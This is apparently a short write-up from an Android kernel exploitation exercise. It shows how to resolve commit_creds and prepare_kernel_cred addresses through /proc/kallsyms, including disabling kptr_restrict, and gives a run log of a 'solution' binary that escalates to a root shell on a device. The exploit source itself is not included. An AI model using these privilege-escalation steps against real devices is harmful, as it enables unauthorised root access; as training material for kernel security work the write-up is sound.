It is necessary to know locations of certain functions inside the kernel.  In our case we are using shellcode that requires  prepare_kernel_cred and commit_creds to set the current processes euid to 0 (root)

There is a proc interface kallsyms (kallsysms) which names the exported kernel symbol as well as the address at which it is located. However, in recent kernel versions, Dan Rosenberg and others have restricted these symbols for viewing ionly by those with CAP_SYS_ADMIN privledeges: http://lwn.net/Articles/420403/

with this enabled:
```
adb shell cat /proc/kallsyms | grep commit_creds
00000000 T commit_creds
```

In order for this exploit to resolve symbols,
you need to 
````
  adb shell su -c "echo 0 > /proc/sys/kernel/kptr_restrict"
```

And now we can properly see the kernel symbols and their addresses:
```
adb shell cat /proc/kallsyms | grep commit_creds
c008e138 T commit_creds
```


This is a bit of a catch22, though.  In order to get root, you need root. There are other ways to get the kernel addresses for kernel symbols.  If you are able to obtain the boot.img for the device, you can analyze the kernel directly to extract the symbols of interest for your exploit.

```
```
adb push solution /data/local/tmp/ && adb shell /data/local/tmp/solution
solution                                                                                                                                           100%   63KB  62.5KB/s   00:00
2269 KB/s (64044 bytes in 0.027s)
[+] resolved symbol commit_creds to 0xc01bb95c
[+] resolved symbol prepare_kernel_cred to 0xc01bbf24
[+] RunHandler at 0x815d
uid=0, euid=0
root@hammerhead:/ #
```
